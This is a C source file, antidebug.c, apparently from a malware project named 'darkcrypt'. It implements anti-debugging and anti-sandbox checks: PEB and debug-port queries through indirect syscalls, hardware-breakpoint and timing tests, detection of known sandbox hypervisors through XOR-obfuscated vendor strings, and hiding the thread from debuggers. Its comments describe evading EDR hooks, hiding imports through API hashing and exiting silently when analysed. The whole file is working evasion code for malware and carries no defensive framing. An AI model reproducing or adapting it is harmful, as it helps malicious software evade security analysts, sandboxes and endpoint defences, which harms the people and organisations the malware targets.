/*
 * antidebug.c — Layered anti-debugging for darkcrypt (F12 hardened)
 *
 * Checks:
 *  1. PEB->BeingDebugged         (direct gs:[0x60] read)
 *  2. PEB->NtGlobalFlag          (heap-debug flags, direct PEB read)
 *  3. ProcessDebugPort           (NtQueryInformationProcess via Halos)
 *  4. ProcessDebugObjectHandle   (class 0x1E, via Halos — fail-closed)
 *  5. ProcessDebugFlags          (class 0x1F, via Halos — fail-closed)
 *  6. Hardware breakpoints       (DR0-DR3 via GetThreadContext-by-hash)
 *  7. Hypervisor / sandbox VM    (CPUID hypervisor bit + vendor string)
 *  8. Timing                     (relative QPC vs RDTSC + 100ms ceiling)
 *  9. NtSetInformationThread(ThreadHideFromDebugger) via Halos
 *
 * Fail-closed policy:
 *  - check_debug_port, check_debug_object_and_flags:
 *    if the syscall itself fails (SSN invalid or undocumented status),
 *    return TRUE (detected) — a hooked EDR shouldn't silently pass.
 *  - check_peb_debugger, check_ntglobal_flag, check_hw_breakpoints:
 *    read hardware/PEB state directly — fail-open (FALSE) on read error.
 *  - check_hypervisor: fail-open (FALSE) unless a known sandbox vendor matches.
 *  - check_timing: fail-open if QPC/QPF cannot be resolved by hash.
 *
 * No plaintext API imports: GetThreadContext, QueryPerformanceCounter,
 * QueryPerformanceFrequency are resolved by DJB2 hash from kernel32 via
 * peb_resolve_kernel32().  GetCurrentThread() is replaced by the
 * NtCurrentThread pseudo-handle (HANDLE)-2, eliminating that import too.
 *
 * On detection: caller exits silently (no message, no cleanup).
 */

#include "antidebug.h"
#include "peb.h"
#include "halos.h"
#include "obfuscation.h"
#include <intrin.h>     /* __cpuid, __rdtsc, __readgsqword */
#include <string.h>     /* memcmp, memcpy */
#include <stdint.h>

/* ---- Process / Thread information classes ---- */
#define ProcessDebugPort           7
#define ProcessDebugObjectHandle   0x1E
#define ProcessDebugFlags          0x1F
#define ThreadHideFromDebugger     0x11

/* ---- NTSTATUS constants ---- */
#define STATUS_SUCCESS             ((LONG)0x00000000)
#define STATUS_PORT_NOT_SET       ((LONG)0xC0000035)

/* ---- NtGlobalFlag heap-debug bits (PEB + 0xBC on x64) ---- */
#define FLG_HEAP_ENABLE_TAIL_CHECK    0x10
#define FLG_HEAP_ENABLE_FREE_CHECK    0x20
#define FLG_HEAP_VALIDATE_PARAMETERS  0x40

/* ---- NtCurrentThread pseudo-handle (avoids GetCurrentThread import) ----
 * On Windows NT x64, GetCurrentThread() returns (HANDLE)-2 (0xFF..FE).
 * Using this constant directly eliminates the kernel32 import. */
#define CURRENT_THREAD_HANDLE ((HANDLE)(LONG_PTR)(-2))

/* ---- Function pointer typedefs for hash-resolved kernel32 APIs ---- */
typedef void (WINAPI *QueryPerformanceCounter_t)(LARGE_INTEGER *);
typedef void (WINAPI *QueryPerformanceFrequency_t)(LARGE_INTEGER *);
typedef BOOL (WINAPI *GetThreadContext_t)(HANDLE, LPCONTEXT);

/* ============================================================= *
 *  Check 1: PEB->BeingDebugged (direct gs:[0x60] read)
 *  Fail-open: if PEB unreadable, assume clean.
 * ============================================================= */
static BOOL check_peb_debugger(void)
{
    BYTE *peb = (BYTE *)__readgsqword(0x60);
    if (!peb) return FALSE;
    /* BeingDebugged is at PEB offset 0x02 */
    return peb[0x02] != 0;
}

/* ============================================================= *
 *  Check 2: PEB->NtGlobalFlag (heap-debug flags)
 *  At PEB + 0xBC on x64.  If any of the heap-debug flags are set, the
 *  process was likely launched under a debugger.
 *  Fail-open: direct PEB read.
 * ============================================================= */
static BOOL check_ntglobal_flag(void)
{
    BYTE *peb = (BYTE *)__readgsqword(0x60);
    if (!peb) return FALSE;
    DWORD gflag = *(DWORD *)(peb + 0xBC);
    if (gflag & (FLG_HEAP_ENABLE_TAIL_CHECK |
                 FLG_HEAP_ENABLE_FREE_CHECK |
                 FLG_HEAP_VALIDATE_PARAMETERS)) {
        DBG_PRINTF("[ad] NtGlobalFlag heap-debug bits set: 0x%lX\n",
                   (unsigned long)gflag);
        return TRUE;
    }
    return FALSE;
}

/* ============================================================= *
 *  Check 3: NtQueryInformationProcess(ProcessDebugPort)
 *  Fail-CLOSED: SSN failure or non-success status -> detected.
 *  The only valid "no debugger" outcome is STATUS_SUCCESS with port==0.
 * ============================================================= */
static BOOL check_debug_port(void)
{
    HANDLE proc = (HANDLE)(-1);   /* current process */
    DWORD_PTR port = 0;
    ULONG retLen = 0;

    LONG status = halos_invoke_hash(HASH_NtQueryInformationProcess,
                                    proc,
                                    (void *)(ULONG_PTR)ProcessDebugPort,
                                    &port,
                                    (void *)(ULONG_PTR)sizeof(port),
                                    &retLen,
                                    NULL);

    /* Fail-closed: any non-success status is suspicious */
    if (status != STATUS_SUCCESS) {
        DBG_PRINTF("[ad] ProcessDebugPort syscall failed: 0x%lX\n",
                   (unsigned long)status);
        return TRUE;
    }
    return port != 0;
}

/* ============================================================= *
 *  Check 4+5: ProcessDebugObjectHandle (0x1E) + ProcessDebugFlags (0x1F)
 *  Combined into one function (both via the same syscall).
 *  Fail-CLOSED for both.
 *
 *  ProcessDebugObjectHandle:
 *    STATUS_SUCCESS + non-NULL handle -> debugger present
 *    STATUS_PORT_NOT_SET (0xC0000035) -> no debugger (NOT a detection)
 *    any other status / SSN failure -> fail-closed (detected)
 *
 *  ProcessDebugFlags:
 *    STATUS_SUCCESS + flags==0 (NoDebugInherit) -> debugger present
 *    STATUS_SUCCESS + flags!=0 -> no debugger
 *    any other status / SSN failure -> fail-closed (detected)
 * ============================================================= */
static BOOL check_debug_object_and_flags(void)
{
    HANDLE proc = (HANDLE)(-1);
    ULONG retLen = 0;

    /* --- ProcessDebugObjectHandle (class 0x1E) --- */
    HANDLE hDebug = NULL;
    LONG status = halos_invoke_hash(HASH_NtQueryInformationProcess,
                                    proc,
                                    (void *)(ULONG_PTR)ProcessDebugObjectHandle,
                                    &hDebug,
                                    (void *)(ULONG_PTR)sizeof(hDebug),
                                    &retLen,
                                    NULL);
    if (status == STATUS_SUCCESS) {
        if (hDebug != NULL) {
            DBG_PRINTF("[ad] ProcessDebugObjectHandle: debugger handle present\n");
            return TRUE;
        }
        /* handle NULL + success -- fall through to ProcessDebugFlags */
    } else if (status != STATUS_PORT_NOT_SET) {
        /* Not the documented "no debugger" status -> fail-closed */
        DBG_PRINTF("[ad] ProcessDebugObjectHandle unexpected status: 0x%lX\n",
                   (unsigned long)status);
        return TRUE;
    }
    /* status == STATUS_PORT_NOT_SET -> no debug object, continue */

    /* --- ProcessDebugFlags (class 0x1F) --- */
    DWORD debugFlags = 0;
    retLen = 0;
    status = halos_invoke_hash(HASH_NtQueryInformationProcess,
                               proc,
                               (void *)(ULONG_PTR)ProcessDebugFlags,
                               &debugFlags,
                               (void *)(ULONG_PTR)sizeof(debugFlags),
                               &retLen,
                               NULL);
    if (status != STATUS_SUCCESS) {
        DBG_PRINTF("[ad] ProcessDebugFlags syscall failed: 0x%lX\n",
                   (unsigned long)status);
        return TRUE;  /* fail-closed */
    }
    if (debugFlags == 0) {
        DBG_PRINTF("[ad] ProcessDebugFlags: NoDebugInherit=0 -> debugger\n");
        return TRUE;
    }
    return FALSE;
}

/* ============================================================= *
 *  Check 6: Hardware breakpoints (DR0-DR3)
 *  GetThreadContext resolved by hash from kernel32 (no import).
 *  GetCurrentThread replaced by NtCurrentThread pseudo-handle (-2).
 *  Fail-open: if GetThreadContext can't be resolved, skip.
 * ============================================================= */
static BOOL check_hw_breakpoints(void)
{
    GetThreadContext_t pGetThreadContext =
        (GetThreadContext_t)peb_resolve_kernel32(HASH_GetThreadContext);
    if (!pGetThreadContext) {
        DBG_PRINTF("[ad] GetThreadContext not resolved by hash\n");
        return FALSE;
    }

    CONTEXT ctx;
    secure_zero(&ctx, sizeof(ctx));
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    if (!pGetThreadContext(CURRENT_THREAD_HANDLE, &ctx))
        return FALSE;

    return ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3;
}

/* ============================================================= *
 *  Check 7: CPUID hypervisor bit + sandbox vendor string
 *
 *  CPUID leaf 1, ECX bit 31 = hypervisor present.
 *  If set, query leaf 0x40000000 for the 12-byte hypervisor vendor
 *  string (EBX:ECX:EDX) and compare against known sandbox vendors.
 *  Vendor strings are XOR-encoded in .rdata (no plaintext).
 *
 *  Only flag VMs with a KNOWN sandbox vendor string to avoid
 *  false-positives in legitimate corporate VM environments.
 *  Fail-open: if CPUID unavailable or vendor unknown, return FALSE.
 * ============================================================= */

/* V1: multi-byte rolling-key XOR (4-byte keys) */
static const uint8_t enc_key_vmware[4] = { 0xa9, 0x39, 0x92, 0xa2 };
static const uint8_t enc_vmware[] = { 0xff, 0x74, 0xe5, 0xc3, 0xdb, 0x5c, 0xc4, 0xef, 0xde, 0x58, 0xe0, 0xc7 };

static const uint8_t enc_key_mshv[4] = { 0x6d, 0xa3, 0x42, 0xfc };
static const uint8_t enc_mshv[] = { 0x20, 0xca, 0x21, 0x8e, 0x02, 0xd0, 0x2d, 0x9a, 0x19, 0x83, 0x0a, 0x8a };

static const uint8_t enc_key_xen[4] = { 0x7c, 0xc8, 0x42, 0xbd };
static const uint8_t enc_xen[] = { 0x24, 0xad, 0x2c, 0xeb, 0x31, 0x85, 0x1a, 0xd8, 0x12, 0x9e, 0x0f, 0xf0 };

static const uint8_t enc_key_kvm[4] = { 0xea, 0x7c, 0x4a, 0xf7 };
static const uint8_t enc_kvm[] = { 0xa1, 0x2a, 0x07, 0xbc, 0xbc, 0x31, 0x01, 0xa1, 0xa7 };

static const uint8_t enc_key_qemu[4] = { 0x68, 0xd5, 0xd6, 0x7c };
static const uint8_t enc_qemu[] = { 0x3c, 0x96, 0x91, 0x28, 0x2b, 0x92, 0x82, 0x3f, 0x2f, 0x81, 0x95, 0x3b };

static const uint8_t enc_key_vbox[4] = { 0x2d, 0x60, 0x81, 0xcd };
static const uint8_t enc_vbox[] = { 0x7b, 0x22, 0xee, 0xb5, 0x7b, 0x22, 0xee, 0xb5, 0x7b, 0x22, 0xee, 0xb5 };

/* Compare a 12-byte CPUID vendor buffer against one XOR-encoded string.
 * Decoded with a per-vendor multi-byte rolling key via xor_dec_mb(). */
static BOOL vendor_matches(const uint8_t *enc, const char *vendor12,
                           const uint8_t *key, int key_len)
{
    char decoded[13];  /* 12 bytes + null terminator from xor_dec_mb */
    xor_dec_mb(decoded, enc, 12, key, key_len);
    return memcmp(decoded, vendor12, 12) == 0;
}

static BOOL check_hypervisor(void)
{
    int info[4];

    /* Leaf 1: ECX bit 31 = hypervisor present */
    __cpuid(info, 1);
    if (!(info[2] & (1u << 31)))
        return FALSE;  /* no hypervisor -- clean */

    /* Hypervisor present -- query vendor string (leaf 0x40000000) */
    __cpuid(info, 0x40000000);

    /* Build 12-byte vendor string: EBX[0..3], ECX[0..3], EDX[0..3] */
    char vendor[12];
    memcpy(vendor,     &info[1], 4);  /* EBX */
    memcpy(vendor + 4, &info[2], 4);  /* ECX */
    memcpy(vendor + 8, &info[3], 4);  /* EDX */

    DBG_PRINTF("[ad] hypervisor vendor: %.12s\n", vendor);

    if (vendor_matches(enc_vmware, vendor, enc_key_vmware, 4) ||
        vendor_matches(enc_mshv,    vendor, enc_key_mshv,    4) ||
        vendor_matches(enc_xen,     vendor, enc_key_xen,     4) ||
        vendor_matches(enc_kvm,     vendor, enc_key_kvm,     4) ||
        vendor_matches(enc_qemu,    vendor, enc_key_qemu,    4) ||
        vendor_matches(enc_vbox,    vendor, enc_key_vbox,    4)) {
        DBG_PRINTF("[ad] known sandbox hypervisor detected\n");
        return TRUE;
    }

    /* Hypervisor present but unknown vendor -- could be legitimate.
     * Do NOT flag (avoid false-positives in corporate environments). */
    return FALSE;
}

/* ============================================================= *
 *  Check 8: Relative timing (QPC vs RDTSC + absolute ceiling)
 *
 *  Replaces the old fixed 50000us threshold with:
 *   1. Calibrate TSC ticks/microsecond over a short QPC interval.
 *   2. Run a workload loop, measuring elapsed with both QPC and RDTSC.
 *   3. Compute qpc_us and rdtsc_us independently.
 *   4. If qpc_us > 50x rdtsc_us (or vice versa), a timer is hooked.
 *   5. Absolute ceiling: if QPC reports >100ms, single-stepping.
 *
 *  QPC/QPF resolved by hash from kernel32 (no plaintext imports).
 *  Fail-open if QPC/QPF cannot be resolved.
 * ============================================================= */
static BOOL check_timing(void)
{
    QueryPerformanceCounter_t pQPC =
        (QueryPerformanceCounter_t)peb_resolve_kernel32(HASH_QueryPerformanceCounter);
    QueryPerformanceFrequency_t pQPF =
        (QueryPerformanceFrequency_t)peb_resolve_kernel32(HASH_QueryPerformanceFrequency);
    if (!pQPC || !pQPF) {
        DBG_PRINTF("[ad] QPC/QPF not resolved by hash\n");
        return FALSE;
    }

    LARGE_INTEGER freq;
    pQPF(&freq);
    if (freq.QuadPart == 0) return FALSE;

    /* --- Calibrate TSC ticks per microsecond --- */
    LARGE_INTEGER cq0, cq1;
    unsigned long long tsc0, tsc1;
    volatile int cal = 0;

    pQPC(&cq0); tsc0 = __rdtsc();
    for (int i = 0; i < 10000; i++) cal += i;
    tsc1 = __rdtsc(); pQPC(&cq1);

    double cal_us = (double)(cq1.QuadPart - cq0.QuadPart) * 1e6 /
                    (double)freq.QuadPart;
    if (cal_us <= 0.0) return FALSE;
    double tsc_per_us = (double)(tsc1 - tsc0) / cal_us;
    if (tsc_per_us <= 0.0) return FALSE;

    /* --- Workload: measure with both QPC and RDTSC --- */
    LARGE_INTEGER wq0, wq1;
    unsigned long long wtsc0, wtsc1;
    volatile int sum = 0;

    pQPC(&wq0); wtsc0 = __rdtsc();
    for (int i = 0; i < 100000; i++) sum += i;
    wtsc1 = __rdtsc(); pQPC(&wq1);

    double qpc_us = (double)(wq1.QuadPart - wq0.QuadPart) * 1e6 /
                    (double)freq.QuadPart;
    double rdtsc_us = (double)(wtsc1 - wtsc0) / tsc_per_us;

    DBG_PRINTF("[ad] timing: qpc_us=%.1f rdtsc_us=%.1f ratio=%.2f\n",
               qpc_us, rdtsc_us,
               (rdtsc_us > 0.0) ? (qpc_us / rdtsc_us) : 0.0);

    /* Absolute ceiling: >100ms under QPC = single-stepping */
    if (qpc_us > 100000.0) {
        DBG_PRINTF("[ad] timing absolute ceiling exceeded (%.1f us)\n", qpc_us);
        return TRUE;
    }

    /* Ratio: QPC inflated vs RDTSC (hooked QPC) or vice versa */
    if (rdtsc_us > 0.0) {
        if (qpc_us > 50.0 * rdtsc_us) return TRUE;
        if (rdtsc_us > 50.0 * qpc_us) return TRUE;
    }

    return FALSE;
}

/* ============================================================= *
 *  Run all anti-debug checks
 *  Order: cheapest/most-reliable first.
 *  Note: antidebug_hide_thread() runs AFTER this per the caller's
 *  contract in aes-main.c.
 * ============================================================= */
BOOL antidebug_check(void)
{
    if (check_peb_debugger())            return TRUE;
    if (check_ntglobal_flag())           return TRUE;
    if (check_debug_port())              return TRUE;
    if (check_debug_object_and_flags())  return TRUE;
    if (check_hw_breakpoints())          return TRUE;
    if (check_hypervisor())              return TRUE;
    if (check_timing())                  return TRUE;
    return FALSE;
}

/* ============================================================= *
 *  Hide current thread from debugger
 *  NtSetInformationThread(ThreadHideFromDebugger) via Halos.
 *  Uses NtCurrentThread pseudo-handle (-2) instead of GetCurrentThread().
 * ============================================================= */
void antidebug_hide_thread(void)
{
    LONG status = halos_invoke_hash(HASH_NtSetInformationThread,
                                    CURRENT_THREAD_HANDLE,
                                    (void *)(ULONG_PTR)ThreadHideFromDebugger,
                                    NULL,
                                    (void *)(ULONG_PTR)0,
                                    NULL,
                                    NULL);
    if (status != STATUS_SUCCESS) {
        DBG_PRINTF("[ad] ThreadHideFromDebugger failed: 0x%lX\n",
                   (unsigned long)status);
    }
}